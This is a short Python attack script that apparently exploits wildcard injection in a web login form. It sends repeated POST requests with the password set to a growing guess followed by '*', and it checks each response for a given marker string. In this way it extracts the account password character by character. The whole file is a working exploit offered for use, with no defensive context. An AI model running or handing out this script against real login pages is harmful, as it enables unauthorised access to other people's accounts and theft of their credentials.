import string,requests,sys

if '-h' in sys.argv[1]:
    print('USAGE: wcbf.py <URL> <USERNAME> <FALSE-STRING>')
else:
    chars = string.printable.replace('*','')
    url=sys.argv[1]
    fs=sys.argv[3]
    pw=''
    rdata={'username':sys.argv[2],'password':pw}
    count=0

    while count <= len(chars):
        for i in chars:
            count+=1
            rdata['password']=pw+i+'*'
            print(rdata)
            r = requests.post(url,data=rdata)
            if (fs in r.text):
                count=0
                pw+=i
                print(pw)
                break
